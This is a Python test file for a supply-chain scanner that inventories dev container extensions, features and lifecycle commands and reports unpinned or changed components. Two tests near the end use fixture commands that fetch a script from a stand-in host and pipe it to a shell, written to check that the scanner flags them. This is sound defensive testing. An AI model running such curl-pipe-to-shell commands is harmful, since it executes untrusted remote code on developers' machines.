"""Dev container extensions, features, and lifecycle commands, and VS Code
extension recommendations."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

import pytest

from controlloop.acbom import EdgeType, Node, host_node_id
from controlloop.adapters import (
    DevcontainerAdapter,
    DiscoveryResult,
    ScanContext,
    run_adapters,
)
from controlloop.bom import build_acbom_document
from controlloop.diff.compute import compute_diff
from controlloop.findings.models import Finding, FindingChangeState, FindingSeverity
from controlloop.policy.models import RuleContext
from controlloop.policy.rules import (
    agent_hook_command_change_findings,
    unpinned_agent_component_findings,
)
from controlloop.policy.rules.hook_script_changed import (
    findings as hook_script_changed_findings,
)
from controlloop.repository import resolve_repository_root

_CONFIG = ".devcontainer/devcontainer.json"
_SECRET = "planted-devcontainer-secret-3c1f"


def _write(root: Path, relative_path: str, content: object) -> None:
    target = root / relative_path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content if isinstance(content, str) else json.dumps(content))


def _run(root: Path) -> DiscoveryResult:
    return run_adapters(
        [DevcontainerAdapter()], ScanContext(root=resolve_repository_root(root))
    )


def _by_name(result: DiscoveryResult) -> dict[str, Node]:
    return {node.name: node for node in result.nodes}


def _context(head: Path, base: Path | None = None) -> RuleContext:
    current = build_acbom_document(resolve_repository_root(head))
    diff = None
    if base is not None:
        baseline = build_acbom_document(resolve_repository_root(base))
        diff = compute_diff(
            baseline_nodes=baseline.nodes,
            baseline_edges=baseline.edges,
            current_nodes=current.nodes,
            current_edges=current.edges,
        )
    return RuleContext(acbom=current, policy_version="test", diff=diff)


def _repos(tmp_path: Path) -> tuple[Path, Path]:
    base, head = tmp_path / "base", tmp_path / "head"
    base.mkdir()
    head.mkdir()
    return base, head


def _summary(findings: tuple[Finding, ...]) -> list[tuple[str, FindingSeverity]]:
    return sorted((finding.message, finding.severity) for finding in findings)


_FULL = {
    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
    "customizations": {
        "vscode": {
            "extensions": [
                "ms-python.python@2024.2.1",
                "esbenp.prettier-vscode",
                "acme.preview@prerelease",
                "-dbaeumer.vscode-eslint",
            ]
        }
    },
    "features": {
        "ghcr.io/devcontainers/features/node@sha256:" + "a" * 64: {},
        "ghcr.io/devcontainers/features/github-cli:1": {},
    },
    "initializeCommand": "bash .devcontainer/init.sh",
    "postCreateCommand": "npm ci",
    "postStartCommand": {"server": "npm start", "watch": ["npm", "run", "watch"]},
}


class TestExtensions:
    def test_only_an_exact_version_pins_an_extension(self, tmp_path: Path) -> None:
        _write(tmp_path, _CONFIG, _FULL)

        nodes = _by_name(_run(tmp_path))

        python = nodes["editor extension ms-python.python"]
        assert python.subtype == "plugin"
        assert python.attributes["source_type"] == "editor-extension"
        assert python.attributes["ref"] == "2024.2.1"
        assert python.security_attributes.pinned is True
        assert (
            nodes["editor extension esbenp.prettier-vscode"].security_attributes.pinned
            is False
        )
        preview = nodes["editor extension acme.preview"]
        assert preview.security_attributes.pinned is False
        assert preview.attributes["ref"] == "prerelease"
        # A leading minus removes an extension; it is not one installed.
        assert not any("vscode-eslint" in name for name in nodes)

    @pytest.mark.parametrize(
        ("entry", "pinned"),
        [
            ("acme.tool@1.2.3", True),
            ("acme.tool@1.2.3-beta.1", True),
            ("acme.tool@1.2", False),
            ("acme.tool@latest", False),
            ("acme.tool", False),
        ],
    )
    def test_version_forms(self, tmp_path: Path, entry: str, pinned: bool) -> None:
        _write(
            tmp_path, _CONFIG, {"customizations": {"vscode": {"extensions": [entry]}}}
        )

        (node,) = [n for n in _run(tmp_path).nodes if n.subtype == "plugin"]

        assert node.security_attributes.pinned is pinned

    def test_the_older_top_level_form_is_read(self, tmp_path: Path) -> None:
        _write(tmp_path, ".devcontainer.json", {"extensions": ["acme.tool@1.0.0"]})

        nodes = _by_name(_run(tmp_path))

        assert nodes["editor extension acme.tool"].security_attributes.pinned is True

    def test_the_extension_is_invoked_by_the_dev_containers_host(
        self, tmp_path: Path
    ) -> None:
        _write(tmp_path, _CONFIG, _FULL)

        result = _run(tmp_path)

        node = _by_name(result)["editor extension ms-python.python"]
        assert any(
            edge.source == host_node_id("devcontainer")
            and edge.target == node.id
            and edge.type is EdgeType.INVOKES
            for edge in result.edges
        )
        assert _by_name(result)["Dev Containers"].subtype == "host"

    def test_a_version_change_keeps_the_component_identity(
        self, tmp_path: Path
    ) -> None:
        base, head = _repos(tmp_path)
        for root, version in ((base, "1.0.0"), (head, "1.0.1")):
            _write(
                root,
                _CONFIG,
                {
                    "customizations": {
                        "vscode": {"extensions": [f"acme.tool@{version}"]}
                    }
                },
            )

        before = _by_name(_run(base))["editor extension acme.tool"]
        after = _by_name(_run(head))["editor extension acme.tool"]

        assert before.id == after.id
        assert (before.attributes["ref"], after.attributes["ref"]) == ("1.0.0", "1.0.1")


class TestFeatures:
    @pytest.mark.parametrize(
        ("reference", "pinned", "ref"),
        [
            (
                "ghcr.io/devcontainers/features/node@sha256:" + "b" * 64,
                True,
                "sha256:" + "b" * 64,
            ),
            ("ghcr.io/devcontainers/features/node:1.4.2", True, "1.4.2"),
            ("ghcr.io/devcontainers/features/node:1", False, "1"),
            ("ghcr.io/devcontainers/features/node:1.4", False, "1.4"),
            ("ghcr.io/devcontainers/features/node:latest", False, "latest"),
            ("ghcr.io/devcontainers/features/node", False, None),
            ("localhost:5000/features/node:1.4.2", True, "1.4.2"),
            ("ghcr.io/devcontainers/features/node@sha256:short", False, "sha256:short"),
        ],
    )
    def test_only_a_digest_or_exact_tag_pins_a_feature(
        self, tmp_path: Path, reference: str, pinned: bool, ref: str | None
    ) -> None:
        _write(tmp_path, _CONFIG, {"features": {reference: {}}})

        (node,) = [n for n in _run(tmp_path).nodes if n.subtype == "plugin"]

        assert node.attributes["source_type"] == "devcontainer-feature"
        assert node.attributes["origin"] == "registry"
        assert node.security_attributes.pinned is pinned
        assert node.attributes.get("ref") == ref

    def test_a_local_feature_is_pinned_and_a_tarball_is_not(
        self, tmp_path: Path
    ) -> None:
        _write(
            tmp_path,
            _CONFIG,
            {
                "features": {
                    "./local-feature": {},
                    "https://example.test/devcontainer-feature-go.tgz": {},
                }
            },
        )

        nodes = [n for n in _run(tmp_path).nodes if n.subtype == "plugin"]
        by_origin = {n.attributes["origin"]: n for n in nodes}

        assert by_origin["local"].security_attributes.pinned is True
        assert by_origin["tarball"].security_attributes.pinned is False

    def test_a_tag_change_keeps_the_component_identity(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        feature = "ghcr.io/devcontainers/features/node"
        _write(base, _CONFIG, {"features": {f"{feature}:1.4.2": {}}})
        _write(head, _CONFIG, {"features": {f"{feature}:1": {}}})

        (before,) = [n for n in _run(base).nodes if n.subtype == "plugin"]
        (after,) = [n for n in _run(head).nodes if n.subtype == "plugin"]

        assert before.id == after.id

    def test_option_values_are_not_recorded(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            _CONFIG,
            {"features": {"ghcr.io/acme/features/tool:1.0.0": {"token": _SECRET}}},
        )

        recorded = "\n".join(n.model_dump_json() for n in _run(tmp_path).nodes)

        assert _SECRET not in recorded


class TestLifecycleCommands:
    def test_string_array_and_object_forms(self, tmp_path: Path) -> None:
        _write(tmp_path, _CONFIG, _FULL)

        commands = {
            node.attributes["setting"]: node
            for node in _run(tmp_path).nodes
            if node.subtype == "helper-command"
        }

        assert sorted(commands) == [
            "initializeCommand",
            "postCreateCommand",
            "postStartCommand.server",
            "postStartCommand.watch",
        ]
        assert commands["postCreateCommand"].attributes["command"] == "npm ci"
        assert (
            commands["postStartCommand.watch"].attributes["command"] == "npm run watch"
        )
        assert (
            commands["postStartCommand.watch"].attributes["event"] == "postStartCommand"
        )
        assert commands["initializeCommand"].attributes["runs_on_host"] == "true"
        assert commands["postCreateCommand"].attributes["runs_on_host"] == "false"
        assert all(
            node.security_attributes.code_execution is True
            for node in commands.values()
        )

    def test_a_committed_script_is_tracked_by_digest(self, tmp_path: Path) -> None:
        body = b"#!/bin/sh\necho init\n"
        _write(tmp_path, _CONFIG, _FULL)
        (tmp_path / ".devcontainer/init.sh").write_bytes(body)

        (node,) = [
            n
            for n in _run(tmp_path).nodes
            if n.attributes.get("setting") == "initializeCommand"
        ]

        assert node.attributes["script_path"] == ".devcontainer/init.sh"
        assert node.attributes["script_digest"] == (
            "sha256:" + hashlib.sha256(body).hexdigest()
        )

    def test_a_credential_in_a_command_is_redacted(self, tmp_path: Path) -> None:
        credential = "ghp_" + "Q" * 36
        _write(
            tmp_path,
            _CONFIG,
            {"postCreateCommand": f"gh auth login --with-token {credential}"},
        )

        recorded = "\n".join(n.model_dump_json() for n in _run(tmp_path).nodes)

        assert credential not in recorded


class TestFiles:
    def test_a_nested_config_is_read_and_a_deeper_one_is_not(
        self, tmp_path: Path
    ) -> None:
        nested = {"customizations": {"vscode": {"extensions": ["acme.one@1.0.0"]}}}
        _write(tmp_path, ".devcontainer/python/devcontainer.json", nested)
        _write(tmp_path, ".devcontainer/a/b/devcontainer.json", nested)

        adapter = DevcontainerAdapter()
        context = ScanContext(root=resolve_repository_root(tmp_path))

        assert adapter.detect(context).claimed_paths == (
            ".devcontainer/python/devcontainer.json",
        )
        (node,) = [n for n in _run(tmp_path).nodes if n.subtype == "plugin"]
        assert node.evidence[0].path == ".devcontainer/python/devcontainer.json"

    def test_an_image_only_file_is_silent(self, tmp_path: Path) -> None:
        _write(tmp_path, _CONFIG, {"image": "mcr.microsoft.com/devcontainers/base"})

        result = _run(tmp_path)

        assert result.nodes == ()
        assert result.diagnostics == ()

    def test_a_compose_file_is_recorded_as_a_path_and_not_read(
        self, tmp_path: Path
    ) -> None:
        _write(
            tmp_path,
            _CONFIG,
            {"dockerComposeFile": ["../compose.yml", "/etc/compose.yml"]},
        )
        _write(tmp_path, "compose.yml", "{ not valid yaml or json")

        result = _run(tmp_path)

        (host,) = result.nodes
        assert host.attributes["docker_compose_files"] == (
            "<outside-repository>,compose.yml"
        )
        assert result.diagnostics == ()

    def test_a_malformed_file_is_a_diagnostic(self, tmp_path: Path) -> None:
        _write(tmp_path, _CONFIG, "{ not json")

        result = _run(tmp_path)

        assert result.nodes == ()
        (diagnostic,) = result.diagnostics
        assert diagnostic.code == "INCOMPLETE-UNPARSED-REGION"

    @pytest.mark.parametrize(
        "payload",
        [
            {"features": ["not", "an", "object"]},
            {"customizations": {"vscode": {"extensions": "acme.tool"}}},
            {"customizations": {"vscode": {"extensions": [42, "not an id"]}}},
            {"postCreateCommand": 42},
            {"postStartCommand": {"server": 42}},
            {"dockerComposeFile": 42},
        ],
    )
    def test_an_unexpected_shape_is_a_diagnostic_not_a_guess(
        self, tmp_path: Path, payload: dict[str, object]
    ) -> None:
        _write(tmp_path, _CONFIG, payload)

        result = _run(tmp_path)

        assert not [n for n in result.nodes if n.subtype != "host"]
        assert result.diagnostics
        assert all(d.code == "INCOMPLETE-UNPARSED-REGION" for d in result.diagnostics)


class TestRecommendations:
    def test_extensions_json_recommendations_have_no_pin_and_are_not_invoked(
        self, tmp_path: Path
    ) -> None:
        _write(
            tmp_path,
            ".vscode/extensions.json",
            {
                "recommendations": ["ms-python.python", "esbenp.prettier-vscode"],
                "unwantedRecommendations": ["acme.unwanted"],
            },
        )

        result = _run(tmp_path)

        plugins = [n for n in result.nodes if n.subtype == "plugin"]
        assert sorted(n.name for n in plugins) == [
            "editor extension esbenp.prettier-vscode",
            "editor extension ms-python.python",
        ]
        assert all(n.security_attributes.pinned == "unknown" for n in plugins)
        assert all(n.attributes["recommended_only"] == "true" for n in plugins)
        into = [edge for edge in result.edges if edge.target in {n.id for n in plugins}]
        assert {edge.type for edge in into} == {EdgeType.RECEIVES_FROM}
        assert {edge.source for edge in into} == {host_node_id("vscode")}
        assert _by_name(result)["VS Code"].subtype == "host"

    def test_workspace_file_recommendations(self, tmp_path: Path) -> None:
        _write(
            tmp_path,
            "project.code-workspace",
            "// comments are allowed\n"
            '{"folders": [{"path": "."}], "extensions": {"recommendations": '
            '["acme.tool"]},}',
        )

        (node,) = [n for n in _run(tmp_path).nodes if n.subtype == "plugin"]

        assert node.name == "editor extension acme.tool"
        assert node.attributes["key_path"] == 'extensions.recommendations["acme.tool"]'


class TestExistingRulesReportTheseEntries:
    """No rule changes: the entries arrive in shapes the rules already read."""

    def test_unpinned_extensions_and_floating_features_are_reported(
        self, tmp_path: Path
    ) -> None:
        base, head = _repos(tmp_path)
        _write(base, _CONFIG, {"image": "mcr.microsoft.com/devcontainers/base"})
        _write(head, _CONFIG, _FULL)

        findings = unpinned_agent_component_findings(_context(head, base))

        assert _summary(findings) == [
            (
                "Added: Devcontainer feature ghcr.io/devcontainers/features/github-cli "
                "(devcontainer-feature) has no commit or digest pin.",
                FindingSeverity.MEDIUM,
            ),
            (
                "Added: Devcontainer feature ghcr.io/devcontainers/features/node "
                "(devcontainer-feature) is pinned.",
                FindingSeverity.LOW,
            ),
            (
                "Added: Editor extension acme.preview (editor-extension) has no "
                "commit or digest pin.",
                FindingSeverity.MEDIUM,
            ),
            (
                "Added: Editor extension esbenp.prettier-vscode (editor-extension) "
                "has no commit or digest pin.",
                FindingSeverity.MEDIUM,
            ),
            (
                "Added: Editor extension ms-python.python (editor-extension) is "
                "pinned.",
                FindingSeverity.LOW,
            ),
        ]

    def test_dropping_a_version_pin_is_a_changed_pin(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(
            base,
            _CONFIG,
            {"customizations": {"vscode": {"extensions": ["acme.tool@1.0.0"]}}},
        )
        _write(
            head, _CONFIG, {"customizations": {"vscode": {"extensions": ["acme.tool"]}}}
        )

        (finding,) = unpinned_agent_component_findings(_context(head, base))

        assert finding.change_state is FindingChangeState.CHANGED
        assert finding.severity is FindingSeverity.MEDIUM
        assert finding.message.startswith(
            "Editor extension acme.tool changed its ref, pinned."
        )

    def test_a_recommendation_is_reported_as_having_no_pin_to_verify(
        self, tmp_path: Path
    ) -> None:
        base, head = _repos(tmp_path)
        _write(base, ".vscode/extensions.json", {"recommendations": []})
        _write(head, ".vscode/extensions.json", {"recommendations": ["acme.tool"]})

        (finding,) = unpinned_agent_component_findings(_context(head, base))

        assert finding.change_state is FindingChangeState.ADDED
        assert finding.message == (
            "Added: Editor extension acme.tool (editor-extension) has no pin this "
            "repository can verify; its source is resolved elsewhere."
        )

    def test_a_changed_lifecycle_command_is_reported(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(base, _CONFIG, {"postCreateCommand": "npm ci"})
        _write(
            head, _CONFIG, {"postCreateCommand": "npm ci && curl https://x.test/i | sh"}
        )

        (finding,) = agent_hook_command_change_findings(_context(head, base))

        assert finding.change_state is FindingChangeState.CHANGED
        assert finding.severity is FindingSeverity.HIGH
        assert finding.message.startswith(
            "Changed: Setting 'postCreateCommand' for host 'Dev Containers' runs"
        )

    def test_an_added_host_command_is_reported_high(self, tmp_path: Path) -> None:
        base, head = _repos(tmp_path)
        _write(base, _CONFIG, {"postCreateCommand": "npm ci"})
        _write(
            head,
            _CONFIG,
            {"postCreateCommand": "npm ci", "initializeCommand": "./x.sh"},
        )

        (finding,) = agent_hook_command_change_findings(_context(head, base))

        assert finding.change_state is FindingChangeState.ADDED
        assert finding.severity is FindingSeverity.HIGH
        assert "'initializeCommand'" in finding.message

    def test_a_changed_script_behind_a_lifecycle_command_is_reported(
        self, tmp_path: Path
    ) -> None:
        base, head = _repos(tmp_path)
        for root, body in ((base, "npm ci\n"), (head, "curl https://x.test | sh\n")):
            _write(root, _CONFIG, {"postCreateCommand": "bash .devcontainer/setup.sh"})
            _write(root, ".devcontainer/setup.sh", body)

        (finding,) = hook_script_changed_findings(_context(head, base))

        assert finding.severity is FindingSeverity.HIGH
        assert finding.message == (
            "Setting 'postCreateCommand' for host 'Dev Containers' runs "
            "`.devcontainer/setup.sh`, whose contents changed while the command "
            "did not."
        )
